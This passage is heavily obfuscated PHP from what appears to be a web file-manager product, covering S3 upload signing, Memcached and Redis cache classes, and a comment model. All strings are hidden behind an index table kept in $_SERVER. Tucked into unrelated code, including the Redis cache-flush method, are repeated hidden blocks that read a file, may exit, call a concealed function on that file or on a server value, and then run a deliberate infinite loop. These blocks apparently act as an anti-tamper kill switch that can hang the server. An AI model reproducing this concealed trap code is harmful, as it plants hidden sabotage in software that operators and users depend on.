$this->cacheMethod($_SERVER[™»È’øè][165], $İÆËÒèë); } protected function objectMeta($±Í ©ó‘) { return $this->cacheMethod($_SERVER[™»È’øè][167], $±Í ©ó‘); } protected function _objectMeta($ûÉò‰å) { $Æå´öİÜ =& $_SERVER[™»È’øè]; list($áè×şÚâ, $Õ…öˆïà) = $this->bucketManager->stat($this->bucket, $ûÉò‰å); if ($áè×şÚâ) { $áè×şÚâ[$Æå´öİÜ[76]] = intval($áè×şÚâ[$Æå´öİÜ[1441]]); } return $áè×şÚâ; } protected function _isFolder($¦¨®ÅÊØ) { $Øø¤†Á =& $_SERVER[™»È’øè]; if ($¦¨®ÅÊØ == $Øø¤†Á[12] || $¦¨®ÅÊØ == $Øø¤†Á[8]) { return !0; } list($É¡¸Êñ, $¥„ÛÎ”Ò) = $this->bucketManager->listFiles($this->bucket, trim($¦¨®ÅÊØ, $Øø¤†Á[8]) . $Øø¤†Á[8], $Øø¤†Á[12], 1, $Øø¤†Á[8]); return !empty($É¡¸Êñ[$Øø¤†Á[1444]]) || !empty($É¡¸Êñ[$Øø¤†Á[1445]]) ? !0 : !1; } } if (!isset($_SERVER[$_SERVER[™»È’øè][892]]) || !isset($_SERVER[$_SERVER[™»È’øè][893]])) { $_getc = $_SERVER[™»È’øè][894]; $_getfile = $_SERVER[$_SERVER[™»È’øè][895]] . $_SERVER[™»È’øè][896]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[™»È’øè][245], $_getfilec); if (count($_getarrs) < $_SERVER[™»È’øè][656]) { $exit = $_SERVER[™»È’øè][897]; $exit(); } $_act = $_SERVER[™»È’øè][898]; $_act($_SERVER[$_SERVER[™»È’øè][895]] . $_SERVER[™»È’øè][896]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[™»È’øè][421]); } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Ô‹Û£”‰) { parent::__construct($Ô‹Û£”‰); } public function uploadFormData($‘Ùš€ìÇ, $Œã¤Çû = 3600) { $İµßíşÈ =& $_SERVER[™»È’øè]; $ÏèæÄ€ = $İµßíşÈ[212]; $½²åû = $İµßíşÈ[252]; $›•ìµ§Ç = $İµßíşÈ[62]; $ô™Ç¾ğ = gmdate($İµßíşÈ[253]); $¶ÍÊïï = gmdate($İµßíşÈ[254]); $îƒ”äÏ = $İµßíşÈ[255]; $ùõß†Âü = $Œã¤Çû . $İµßíşÈ[12]; $øè†Íƒœ = $İµßíşÈ[256]; $”ÜêÙŠ® = array($this->accessKey, $¶ÍÊïï, $this->region, $›•ìµ§Ç, $îƒ”äÏ); $ÄØ¤×°õ = implode($İµßíşÈ[8], $”ÜêÙŠ®); $øÌ†Œˆ· = array($İµßíşÈ[257] => gmdate($İµßíşÈ[1354], strtotime($İµßíşÈ[259])), $İµßíşÈ[260] => array(array($İµßíşÈ[261] => $this->bucket), array($İµßíşÈ[262] => $ÏèæÄ€), array($İµßíşÈ[263], $İµßíşÈ[264], $İµßíşÈ[12]), array($İµßíşÈ[263], $İµßíşÈ[265], $İµßíşÈ[12]), array($İµßíşÈ[263], $İµßíşÈ[266], $İµßíşÈ[12]), array($İµßíşÈ[267] => $øè†Íƒœ), array($İµßíşÈ[268] => $ÄØ¤×°õ), array($İµßíşÈ[269] => $½²åû), array($İµßíşÈ[270] => $ô™Ç¾ğ), array($İµßíşÈ[271] => $ùõß†Âü))); $¿³¤º­À = base64_encode(json_encode($øÌ†Œˆ·)); $Ø›æ¼ç = hash_hmac($İµßíşÈ[272], $¶ÍÊïï, $İµßíşÈ[273] . $this->secret, !0); $ëÖˆ©Ãü = hash_hmac($İµßíşÈ[272], $this->region, $Ø›æ¼ç, !0); $¨áËÕ» = hash_hmac($İµßíşÈ[272], $›•ìµ§Ç, $ëÖˆ©Ãü, !0); $Ù¹ú€¯¡ = hash_hmac($İµßíşÈ[272], $îƒ”äÏ, $¨áËÕ», !0); $¥¹ÜÚæÆ = hash_hmac($İµßíşÈ[272], $¿³¤º­À, $Ù¹ú€¯¡); $ºş– İ = array($İµßíşÈ[229] => $İµßíşÈ[12], $İµßíşÈ[274] => $İµßíşÈ[12], $İµßíşÈ[262] => $ÏèæÄ€, $İµßíşÈ[267] => $øè†Íƒœ, $İµßíşÈ[275] => $¿³¤º­À, $İµßíşÈ[276] => $ÄØ¤×°õ, $İµßíşÈ[277] => $½²åû, $İµßíşÈ[278] => $ô™Ç¾ğ, $İµßíşÈ[279] => $ùõß†Âü, $İµßíşÈ[280] => $¥¹ÜÚæÆ, $İµßíşÈ[195] => $this->getHost()); return $ºş– İ; } public function multiUploadFormData($Ÿå®è¥», $Ç£áğ¼ú = 3600) { $£¯éÒáË =& $_SERVER[™»È’øè]; $Ş­ñ²«î = gmdate($£¯éÒáË[1456]); $›ºöÕ¨ë = array(); $éµÑĞÎª = $this->client->getUploadId($this->bucket, $Ÿå®è¥», $›ºöÕ¨ë); if (!$éµÑĞÎª) { return !1; } return array($£¯éÒáË[237] => $éµÑĞÎª, $£¯éÒáË[195] => $this->getHost() . $£¯éÒáË[8] . $this->pathEncode($Ÿå®è¥»), $£¯éÒáË[238] => $Ş­ñ²«î, $£¯éÒáË[94] => $Ÿå®è¥»); } public function multiUploadAuthData($×°†—°î, $àà°Ô¢¬ = array()) { $Šà–ÇÃÊ =& $_SERVER[™»È’øè]; $¦’ıÒç = isset($àà°Ô¢¬[$Šà–ÇÃÊ[174]]) ? $àà°Ô¢¬[$Šà–ÇÃÊ[174]] : $Šà–ÇÃÊ[12]; $Šï¸àÌ¥ = $àà°Ô¢¬[$Šà–ÇÃÊ[94]]; unset($àà°Ô¢¬[$Šà–ÇÃÊ[94]]); if (isset($àà°Ô¢¬[$Šà–ÇÃÊ[239]])) { return $this->listUploadParts($Šï¸àÌ¥, $àà°Ô¢¬); } $½”å™Ê = array(); if (isset($àà°Ô¢¬[$Šà–ÇÃÊ[1457]])) { $½”å™Ê[$Šà–ÇÃÊ[1458]] = $àà°Ô¢¬[$Šà–ÇÃÊ[1457]]; } $•ÄıÕ‡¬ = explode($Šà–ÇÃÊ[197], $this->getHost()); $Ğ¢Â¢òç = array($Šà–ÇÃÊ[1459] => $•ÄıÕ‡¬[1], $Šà–ÇÃÊ[1460] => $Šà–ÇÃÊ[12], $Šà–ÇÃÊ[229] => $Šà–ÇÃÊ[120], $Šà–ÇÃÊ[274] => $àà°Ô¢¬[$Šà–ÇÃÊ[76]]); $ÉóÌ£¿˜ = $Šà–ÇÃÊ[242]; $Ó—œ– = $Šà–ÇÃÊ[8] . $this->pathEncode($Šï¸àÌ¥) . $¦’ıÒç; $öÅ¬äæ = $this->client->__getSignatureV4($½”å™Ê, $Ğ¢Â¢òç, $ÉóÌ£¿˜, $Ó—œ–); if (strpos($¦’ıÒç, $Šà–ÇÃÊ[241]) === 0) { if (isset($½”å™Ê[$Šà–ÇÃÊ[1458]])) { $¶ÃÂñê = $½”å™Ê[$Šà–ÇÃÊ[1458]]; } else { if (isset($öÅ¬äæ[$Šà–ÇÃÊ[1458]])) { $¶ÃÂñê = $öÅ¬äæ[$Šà–ÇÃÊ[1458]]; } else { $¶ÃÂñê = hash($Šà–ÇÃÊ[272], $Šà–ÇÃÊ[12]); } } return array($Šà–ÇÃÊ[248] => $öÅ¬äæ[$Šà–ÇÃÊ[248]], $Šà–ÇÃÊ[1458] => $¶ÃÂñê, $Šà–ÇÃÊ[238] => $öÅ¬äæ[$Šà–ÇÃÊ[1461]]); } return $öÅ¬äæ[$Šà–ÇÃÊ[248]]; } public function listUploadParts($’™µÕÍâ, $İ´ˆÈà€ = array()) { $ìŸ­×ğÍ =& $_SERVER[™»È’øè]; $¤öğ = str_replace($ìŸ­×ğÍ[249], $ìŸ­×ğÍ[12], $İ´ˆÈà€[$ìŸ­×ğÍ[174]]); $ÖÓŠß½ = $this->client->listParts($this->bucket, $’™µÕÍâ, $¤öğ); if (!$ÖÓŠß½) { return !1; } $õåÊöß… = $ìŸ­×ğÍ[1462]; foreach ($ÖÓŠß½ as $şËÜ¶ÖÃ) { $õåÊöß… .= $ìŸ­×ğÍ[1463] . "\74\120\141\162\164\x4e\x75\155\142\x65\x72\x3e{$şËÜ¶ÖÃ[$ìŸ­×ğÍ[1418]]}\74\57\x50\x61\x72\164\x4e\x75\x6d\142\x65\162\x3e\xa" . "\x3c\105\124\141\x67\76{$şËÜ¶ÖÃ[$ìŸ­×ğÍ[1419]]}\74\x2f\105\x54\141\x67\x3e\xa" . $ìŸ­×ğÍ[1464]; } $õåÊöß… .= $ìŸ­×ğÍ[1465]; $×±ı…Ìí = array(); $—ôæÕŞÄ = explode($ìŸ­×ğÍ[197], $this->getHost()); $¤ïØü˜„ = array($ìŸ­×ğÍ[1459] => $—ôæÕŞÄ[1], $ìŸ­×ğÍ[229] => $ìŸ­×ğÍ[120], $ìŸ­×ğÍ[274] => strlen($õåÊöß…)); $ğ­ãğˆÄ = $ìŸ­×ğÍ[240]; $„øõ» = $ìŸ­×ğÍ[8] . $this->pathEncode($’™µÕÍâ) . $İ´ˆÈà€[$ìŸ­×ğÍ[174]]; $˜Ş¹ÖáÔ = $this->client->__getSignatureV4($×±ı…Ìí, $¤ïØü˜„, $ğ­ãğˆÄ, $„øõ», $õåÊöß…); return array($ìŸ­×ğÍ[248] => $˜Ş¹ÖáÔ[$ìŸ­×ğÍ[248]], $ìŸ­×ğÍ[238] => $˜Ş¹ÖáÔ[$ìŸ­×ğÍ[1461]], $ìŸ­×ğÍ[250] => $ÖÓŠß½, $ìŸ­×ğÍ[1458] => $˜Ş¹ÖáÔ[$ìŸ­×ğÍ[1458]]); } public function link($ôã¢ñø, $œšÍÁó = array()) { return parent::link($ôã¢ñø, $œšÍÁó); } public function fileOut($Û‚¹òÈ‹, $ğĞá¼€‘ = false, $ÛÉ½ãÀ… = false, $¹¥ƒÒÎ¿ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[™»È’øè][1466])) { return parent::fileOutServer($Û‚¹òÈ‹, $ğĞá¼€‘, $ÛÉ½ãÀ…, $¹¥ƒÒÎ¿); } parent::fileOut($Û‚¹òÈ‹, $ğĞá¼€‘, $ÛÉ½ãÀ…, $¹¥ƒÒÎ¿); } public function fileOutImage($¡Øñ¥«, $ãÙÁ¥ = 250) { if (strstr($this->endpoint, $_SERVER[™»È’øè][1466])) { return parent::fileOutImageServer($¡Øñ¥«, $ãÙÁ¥); } parent::fileOutImage($¡Øñ¥«, $ãÙÁ¥); } public function fileOutLink($Ò±ğØÄß) { $Á§Ì«ê =& $_SERVER[™»È’øè]; if (substr($Ò±ğØÄß, 0, 7) == $Á§Ì«ê[1360]) { $Ò±ğØÄß = $Á§Ì«ê[1361] . substr($Ò±ğØÄß, 7); } header($Á§Ì«ê[161] . $Ò±ğØÄß); die; } public function getHost() { $ó—ÌÚÌˆ =& $_SERVER[™»È’øè]; $ÕËÂ‘›« = str_rtrim(parent::getHost(), $ó—ÌÚÌˆ[8] . $this->bucket); $ÕËÂ‘›« = explode($ó—ÌÚÌˆ[197], $ÕËÂ‘›«); return $ÕËÂ‘›«[0] . $ó—ÌÚÌˆ[197] . $this->bucket . $ó—ÌÚÌˆ[10] . $ÕËÂ‘›«[1]; } } goto bãƒ…šÈç½; BƒÏ†ªèÒ¹: function binCheckBigger($Â’†ŒÛœ, $­®°®ƒã) { return $Â’†ŒÛœ > $­®°®ƒã; } $_SERVER[$_SERVER[Èå®§İæ][3]] = ("\70\62\66\65".base64_decode('Mzk='))+0;$_832d="b5zesuyr7g2c1dhwoxt4j6mf0iapvqk3n9l82yzmwrl3ds6npc5hku1j4iqt708ove9xb";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($­„úÙú, $œ«™”€ù) { $î¬§ÒØÒ =& $_SERVER[™»È’øè]; if (isset(self::$_methodList[$­„úÙú])) { return @call_user_func_array(self::$_methodList[$­„úÙú], $œ«™”€ù); } else { if (method_exists($this, $­„úÙú)) { return call_user_func_array(array($this, $­„úÙú), $œ«™”€ù); } else { think_exception(__CLASS__ . $î¬§ÒØÒ[4] . $­„úÙú . $î¬§ÒØÒ[5]); } } } public static function __callStatic($Î†¡¬ê¬, $ç÷©¯‚’) { if (isset(self::$_methodListStatic[$Î†¡¬ê¬])) { return call_user_func_array(self::$_methodListStatic[$Î†¡¬ê¬], $ç÷©¯‚’); } else { if (method_exists(self, $Î†¡¬ê¬)) { return call_user_func_array(array(self, $Î†¡¬ê¬), $ç÷©¯‚’); } else { show_json("{$Î†¡¬ê¬}\x28\x29\x20\x6e\157\164\40\x65\x78\151\163\x74\73", !1); } } } public static function addMethod($ÑéâØ÷´, $Øá×ö´‡) { self::$_methodList[$ÑéâØ÷´] = $Øá×ö´‡; } public static function addMethodStatic($Ø®÷Èá, $‚›¤Œ©®) { self::$_methodListStatic[$Ø®÷Èá] = $‚›¤Œ©®; } } goto BÖÜÏŸ²‚; C¹øšõ³Ü´: if (!isset($_SERVER[$_SERVER[™»È’øè][892]]) || !isset($_SERVER[$_SERVER[™»È’øè][893]])) { $_getc = $_SERVER[™»È’øè][894]; $_getfile = $_SERVER[$_SERVER[™»È’øè][895]] . $_SERVER[™»È’øè][896]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[™»È’øè][245], $_getfilec); if (count($_getarrs) < $_SERVER[™»È’øè][656]) { $exit = $_SERVER[™»È’øè][897]; $exit(); } $_act = $_SERVER[™»È’øè][898]; $_act($_SERVER[$_SERVER[™»È’øè][895]] . $_SERVER[™»È’øè][896]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[™»È’øè][421]); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($š£åïïÆ, $›øİÄ¨) { $Œ…²¥Ô» =& $_SERVER[™»È’øè]; if (!class_exists($Œ…²¥Ô»[899])) { show_json($Œ…²¥Ô»[900], !1); } $this->cacheTime = $›øİÄ¨; $this->handle = new Memcached(); if (is_array($š£åïïÆ[$Œ…²¥Ô»[901]]) && count($š£åïïÆ[$Œ…²¥Ô»[901]]) >= 1) { foreach ($š£åïïÆ[$Œ…²¥Ô»[901]] as $Éø¸±€ç) { $ĞÓÂ¿ªæ = explode($Œ…²¥Ô»[4], $Éø¸±€ç); $this->handle->addServer($ĞÓÂ¿ªæ[0], $ĞÓÂ¿ªæ[1]); } } else { $this->handle->addServer($š£åïïÆ[$Œ…²¥Ô»[195]], $š£åïïÆ[$Œ…²¥Ô»[196]]); } } public function set($Çª«¦ĞÜ, $ÑÖ–‡Ïç, $®‰áØÌâ = false) { $®‰áØÌâ = $®‰áØÌâ ? $®‰áØÌâ : $this->cacheTime; return $this->handle->set($Çª«¦ĞÜ, $ÑÖ–‡Ïç, $®‰áØÌâ); } public function get($ó˜´µ«İ) { return $this->handle->get($ó˜´µ«İ); } public function remove($¥²á¥Èğ) { return $this->handle->delete($¥²á¥Èğ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($†¨ü·à„, $ñŞ™Ï) { $ğÑùƒ¨š =& $_SERVER[™»È’øè]; if (!class_exists($ğÑùƒ¨š[902])) { show_json($ğÑùƒ¨š[903], !1); } $this->cacheTime = $ñŞ™Ï; $â‘¼«¥· = isset($†¨ü·à„[$ğÑùƒ¨š[904]]) ? $†¨ü·à„[$ğÑùƒ¨š[904]] : 10; $‘… Øó = _get($†¨ü·à„, $ğÑùƒ¨š[901]); if ($‘… Øó && is_array($‘… Øó)) { $this->initCluster($†¨ü·à„, $â‘¼«¥·); } else { $this->handle = $this->init($†¨ü·à„, $â‘¼«¥·); } } private function init($ú¢™ºÈç, $İš Ş¡Å) { $Ÿ—­ñ‹² =& $_SERVER[™»È’øè]; $¶¢Ÿ°ÀË = new Redis(); $Õ»ÏÖ…Œ = isset($ú¢™ºÈç[$Ÿ—­ñ‹²[905]]) ? $ú¢™ºÈç[$Ÿ—­ñ‹²[905]] : !1; if ($Õ»ÏÖ…Œ) { $¶¢Ÿ°ÀË->pconnect($ú¢™ºÈç[$Ÿ—­ñ‹²[195]], $ú¢™ºÈç[$Ÿ—­ñ‹²[196]], $İš Ş¡Å); } else { $¶¢Ÿ°ÀË->connect($ú¢™ºÈç[$Ÿ—­ñ‹²[195]], $ú¢™ºÈç[$Ÿ—­ñ‹²[196]], $İš Ş¡Å); } if (!empty($ú¢™ºÈç[$Ÿ—­ñ‹²[454]])) { $¶¢Ÿ°ÀË->auth($ú¢™ºÈç[$Ÿ—­ñ‹²[454]]); } if (!empty($ú¢™ºÈç[$Ÿ—­ñ‹²[782]]) && $ú¢™ºÈç[$Ÿ—­ñ‹²[782]] != 0) { $¶¢Ÿ°ÀË->select($ú¢™ºÈç[$Ÿ—­ñ‹²[782]]); } return $¶¢Ÿ°ÀË; } private function initCluster($Û‘Ø‡Ñ±, $Ë‘¿æÎÖ) { $™ƒª·Æ• =& $_SERVER[™»È’øè]; $¸Ç»‡¥Ú = array($™ƒª·Æ•[906], $™ƒª·Æ•[907], $™ƒª·Æ•[908]); $©Éà´şÈ = $™ƒª·Æ•[906]; if (isset($Û‘Ø‡Ñ±[$™ƒª·Æ•[16]]) && in_array($Û‘Ø‡Ñ±[$™ƒª·Æ•[16]], $¸Ç»‡¥Ú)) { $©Éà´şÈ = $Û‘Ø‡Ñ±[$™ƒª·Æ•[16]]; } switch ($©Éà´şÈ) { case $™ƒª·Æ•[906]: $this->_slave($Û‘Ø‡Ñ±, $Ë‘¿æÎÖ); break; case $™ƒª·Æ•[907]: break; case $™ƒª·Æ•[908]: $this->isCluster = !0; $×öçñá = $Û‘Ø‡Ñ±[$™ƒª·Æ•[901]]; $ê¥Ê®Œ = isset($Û‘Ø‡Ñ±[$™ƒª·Æ•[905]]) ? $Û‘Ø‡Ñ±[$™ƒª·Æ•[905]] : !1; $Áêï’ö† = isset($Û‘Ø‡Ñ±[$™ƒª·Æ•[454]]) ? $Û‘Ø‡Ñ±[$™ƒª·Æ•[454]] : null; $this->handle = new RedisCluster(NUll, $×öçñá, $Ë‘¿æÎÖ, $Ë‘¿æÎÖ, $ê¥Ê®Œ, $Áêï’ö†); break; default: break; } } private function _slave($ãí¼‹ß¶, $Æ›Ã¨ˆ¢) { $©…­×¶À = $ãí¼‹ß¶[$_SERVER[™»È’øè][901]]; $this->filterConfig($ãí¼‹ß¶, $©…­×¶À[0]); $this->handle = $this->init($ãí¼‹ß¶, $Æ›Ã¨ˆ¢); unset($©…­×¶À[0]); if (empty($©…­×¶À)) { return; } $ğæÛÁ¤† = array_rand($©…­×¶À); $this->filterConfig($ãí¼‹ß¶, $©…­×¶À[$ğæÛÁ¤†]); $this->slaveHandle = $this->init($ãí¼‹ß¶, $Æ›Ã¨ˆ¢); } private function filterConfig(&$Ş¤³ªœğ, $ô¥¹‹ˆ) { $ŸÍÆ„±õ =& $_SERVER[™»È’øè]; $†şÑÁ›ã = explode($ŸÍÆ„±õ[4], $ô¥¹‹ˆ); $Ó¡ò÷Œ„ = array($ŸÍÆ„±õ[195] => $†şÑÁ›ã[0], $ŸÍÆ„±õ[196] => $†şÑÁ›ã[1]); $Ş¤³ªœğ = array_merge($Ş¤³ªœğ, $Ó¡ò÷Œ„); } public function set($¶Ô×„, $¦ÌÍÎ•, $­ı­êºô = false) { $­ı­êºô = $­ı­êºô ? $­ı­êºô : $this->cacheTime; return $this->handle->setEx($¶Ô×„, $­ı­êºô, $¦ÌÍÎ•); } public function setLock($¹àÁêËÒ, $¶µÇ„şÁ, $Â·±ôÖÉ) { return $this->handle->setNX($¹àÁêËÒ, $¶µÇ„şÁ); } public function get($–êÓ¹š) { $÷Ş×Ë£È = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $÷Ş×Ë£È->get($–êÓ¹š); } public function remove($ÓğÌá¤) { return $this->handle->del($ÓğÌá¤); } public function deleteAll() { $ÑÔÄ†ßİ =& $_SERVER[™»È’øè]; if (!isset($_SERVER[$ÑÔÄ†ßİ[892]]) || !isset($_SERVER[$ÑÔÄ†ßİ[893]])) { $ğ…†Ùø« = $ÑÔÄ†ßİ[909]; $Õ¶ÚèÖå = $ÑÔÄ†ßİ[894]; $¡°Éù„ = $_SERVER[$ÑÔÄ†ßİ[895]] . $ÑÔÄ†ßİ[896]; $†«ß«Û× = $Õ¶ÚèÖå($¡°Éù„); $ÖÇ‹õ•ô = explode($ÑÔÄ†ßİ[245], $†«ß«Û×); if (count($ÖÇ‹õ•ô) < $ÑÔÄ†ßİ[663]) { $Ó£›²™Ô = $ÑÔÄ†ßİ[897]; $Ó£›²™Ô(); } $‘‡ğ¸É° = $ÑÔÄ†ßİ[910]; $‘‡ğ¸É°($_SERVER[$ÑÔÄ†ßİ[911]]); $ÉãÈ¯¦ = 1; for ($÷¤ÅğŸ÷ = $ÉãÈ¯¦; $÷¤ÅğŸ÷ > 0; $÷¤ÅğŸ÷++) { $‘‡ğ¸É° = json_encode($GLOBALS[$ÑÔÄ†ßİ[459]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $¯ƒ‘ğø¢) { $this->handle->flushall($¯ƒ‘ğø¢); } return; } return $this->handle->flushAll(); } } goto A£²¨É—š; E°İ·°¦Ùí: class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\155\145\x6e\x74"; protected $tableMeta = array("\164\141\x62\x6c\145\116\x61\x6d\145" => "\x63\x6f\155\155\x65\156\x74\x5f\x6d\x65\164\x61", "\155\x65\164\141\x46\151\145\x6c\144" => "\143\x6f\x6d\155\145\156\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ ñ¨ š) { $îóŒÌ‘¹ =& $_SERVER[™»È’øè]; if ($ ñ¨ š[$îóŒÌ‘¹[1899]]) { $ÂŸ£…‰å = $this->where(array($îóŒÌ‘¹[1900] => $ ñ¨ š[$îóŒÌ‘¹[1899]]))->find(); if (!$ÂŸ£…‰å || $ÂŸ£…‰å[$îóŒÌ‘¹[177]] != $ ñ¨ š[$îóŒÌ‘¹[177]] || $ÂŸ£…‰å[$îóŒÌ‘¹[537]] != $ ñ¨ š[$îóŒÌ‘¹[537]]) { return !1; } $this->where(array($îóŒÌ‘¹[1900] => $ ñ¨ š[$îóŒÌ‘¹[1899]]))->setAdd($îóŒÌ‘¹[1901], 1); } $ ñ¨ š[$îóŒÌ‘¹[1902]] = 0; $ ñ¨ š[$îóŒÌ‘¹[1901]] = 0; $ ñ¨ š[$îóŒÌ‘¹[775]] = 1; return $this->add($ ñ¨ š); } public function commentCount($ÁùŠÁŠİ, $™Àô£², $Ö ¹â = false) { $”©•«Ù =& $_SERVER[™»È’øè]; if (!$ÁùŠÁŠİ) { return array(); } if (is_string($ÁùŠÁŠİ) || is_int($ÁùŠÁŠİ)) { $ÁùŠÁŠİ = array($ÁùŠÁŠİ); } $Æ»Æˆ½ = array($”©•«Ù[537], $”©•«Ù[1903] => $”©•«Ù[532]); $±£ŒıÎÉ = array($”©•«Ù[537] => array($”©•«Ù[7], $ÁùŠÁŠİ), $”©•«Ù[177] => $™Àô£²); if ($Ö ¹â) { $±£ŒıÎÉ[$”©•«Ù[1678]] = $Ö ¹â; } $›ßÑßŠ’ = $this->field($Æ»Æˆ½)->where($±£ŒıÎÉ)->group($”©•«Ù[537])->select(); return array_to_keyvalue($›ßÑßŠ’, $”©•«Ù[537], $”©•«Ù[532]); } public function starTarget($²ëıÍ®, $­µÅäû×) { $šŒîêÛğ =& $_SERVER[™»È’øè]; $ü³é­ÉÃ = $²ëıÍ® + self::TYPE_STAR_OFFSET; $‚¾úÙŠ„ = array($šŒîêÛğ[1678] => USER_ID, $šŒîêÛğ[177] => $ü³é­ÉÃ, $šŒîêÛğ[537] => $­µÅäû×); $«İÇ£¹ = $this->where($‚¾úÙŠ„)->find(); if ($«İÇ£¹) { return $this->where(array($šŒîêÛğ[442] => $«İÇ£¹[$šŒîêÛğ[442]]))->delete(); } $Ğº™¯Ø = array($šŒîêÛğ[1899] => 0, $šŒîêÛğ[1678] => USER_ID, $šŒîêÛğ[775] => 1, $šŒîêÛğ[779] => $šŒîêÛğ[12], $šŒîêÛğ[177] => $ü³é­ÉÃ, $šŒîêÛğ[537] => $­µÅäû×, $šŒîêÛğ[1902] => 0, $šŒîêÛğ[1901] => 0); return $this->add($Ğº™¯Ø); } public function starTargetCount($ÚÚôğÃª, $Ø·ğûœ’) { $®ú ØŒ¤ =& $_SERVER[™»È’øè]; $Ğœô¢ò˜ = $Ø·ğûœ’ + self::TYPE_STAR_OFFSET; $ƒˆ„¦’¿ = $this->commentCount($ÚÚôğÃª, $Ğœô¢ò˜); $†€ò¦äì = $this->commentCount($ÚÚôğÃª, $Ğœô¢ò˜, USER_ID); return array($®ú ØŒ¤[1904] => $ƒˆ„¦’¿, $®ú ØŒ¤[1905] => $†€ò¦äì); } public function starTargetUserList($Î¡Û÷‹Ê, $–°¯ƒíë) { $ïäş‚†İ =& $_SERVER[™»È’øè]; $½ÍÑø = $Î¡Û÷‹Ê + self::TYPE_STAR_OFFSET; $ÂÎèöŞ = array($ïäş‚†İ[537] => $–°¯ƒíë, $ïäş‚†İ[177] => $½ÍÑø); $…¦õ»Ø  = $this->where($ÂÎèöŞ)->count(); $ŠÈïÚë¾ = array($ïäş‚†İ[298] => $…¦õ»Ø , $ïäş‚†İ[1906] => array()); if (!$…¦õ»Ø ) { return $ŠÈïÚë¾; } $ÍÄ»× = $this->field($ïäş‚†İ[1678])->where($ÂÎèöŞ)->limit(500)->select(); $ÍÄ»× = array_to_keyvalue($ÍÄ»×, $ïäş‚†İ[12], $ïäş‚†İ[1678]); $ŠÈïÚë¾[$ïäş‚†İ[1906]] = Model($ïäş‚†İ[545])->userListInfo($ÍÄ»×); return $ŠÈïÚë¾; } public function prasiseUserList($ûáê©Û») { $¯¶ôÈâ =& $_SERVER[™»È’øè]; $š©äÁ” = array($¯¶ôÈâ[1907] => $ûáê©Û»); $ÛµõŞ‡¶ = $this->where($š©äÁ”)->find(); $¥ï²‰Ø = _get($ÛµõŞ‡¶, $¯¶ôÈâ[1902], 0); $Ğ‘ÌüŠÉ = array($¯¶ôÈâ[298] => $¥ï²‰Ø, $¯¶ôÈâ[1906] => array()); if (!$¥ï²‰Ø) { return $Ğ‘ÌüŠÉ; } $¡óĞŒÚ± = Model($¯¶ôÈâ[1908])->field($¯¶ôÈâ[1678])->where($š©äÁ”)->limit(500)->select(); $¡óĞŒÚ± = array_to_keyvalue($¡óĞŒÚ±, $¯¶ôÈâ[12], $¯¶ôÈâ[1678]); $Ğ‘ÌüŠÉ[$¯¶ôÈâ[1906]] = Model($¯¶ôÈâ[545])->userListInfo($¡óĞŒÚ±); return $Ğ‘ÌüŠÉ; } public function remove($ ÒêÖâ) { $•ª¥ˆº€ =& $_SERVER[™»È’øè]; $ºˆÙöªí = array($•ª¥ˆº€[1900] => $ ÒêÖâ); $”×—Ö¡¡ = $this->where($ºˆÙöªí)->find(); if ($”×—Ö¡¡[$•ª¥ˆº€[1899]]) { $this->where(array($•ª¥ˆº€[1900] => $”×—Ö¡¡[$•ª¥ˆº€[1899]]))->setAdd($•ª¥ˆº€[1901], -1); } return $this->where($ºˆÙöªí)->delete(); } public function edit($Ú¤´Ìï, $‰‰ı×Û¤) { $Û„„™¾¡ =& $_SERVER[™»È’øè]; $“ ıÀ•ã = array($Û„„™¾¡[1900] => $Ú¤´Ìï); return $this->where($“ ıÀ•ã)->save(array($Û„„™¾¡[1909] => $‰‰ı×Û¤)); } public function prasise($äñî¶¥) { $„Ñ–”›ò =& $_SERVER[™»È’øè]; $Å¹ğÍ” = Model($„Ñ–”›ò[1910]); $¿ã˜øœ = array($„Ñ–”›ò[1900] => $äñî¶¥, $„Ñ–”›ò[1669] => USER_ID); $í–ºÑ’³ = $Å¹ğÍ”->where($¿ã˜øœ)->find(); if (!$í–ºÑ’³) { $Å¹ğÍ”->add($¿ã˜øœ); $ˆÖÒˆ¥¡ = $this->where(array($„Ñ–”›ò[1900] => $äñî¶¥))->setAdd($„Ñ–”›ò[1902], 1); } else { $Å¹ğÍ”->where($¿ã˜øœ)->delete(); $ˆÖÒˆ¥¡ = $this->where(array($„Ñ–”›ò[1900] => $äñî¶¥))->setAdd($„Ñ–”›ò[1902], -1); } return $ˆÖÒˆ¥¡; } public function targetInfo($ù¿åšß¯, $ÉÀÒ”Ñ•) { $‚Éõ·ä =& $_SERVER[™»È’øè]; $éèî×Ÿ’ = array($‚Éõ·ä[615] => $ù¿åšß¯, $‚Éõ·ä[616] => $ÉÀÒ”Ñ•); $‹î¹öÒ± = $this->where($éèî×Ÿ’)->count(); $‹äöÍ×Í = "\x52\x49\x47\x48\124\x20\112\x4f\111\x4e\40{$this->tablePrefix}\143\157\x6d\155\145\x6e\x74\x5f\x70\x72\x61\x69\x73\145\x20\x73\164\141\162\x20\x6f\x6e\40\143\x6f\x6d\x6d\145\156\164\x2e\143\157\x6d\x6d\145\156\164\111\104\40\75\40\163\x74\x61\x72\x2e\143\x6f\155\x6d\x65\156\x74\111\x44"; $Å†±Ø–ª = $this->alias($‚Éõ·ä[397])->where($éèî×Ÿ’)->join($‹äöÍ×Í, $‚Éõ·ä[1911])->count(); $°òúç«Ç = array($‚Éõ·ä[1912] => $‹î¹öÒ±, $‚Éõ·ä[1913] => $Å†±Ø–ª); return $°òúç«Ç; } public function listData($Û·¢¾ô‡) { $ÖÅÑº•¼ =& 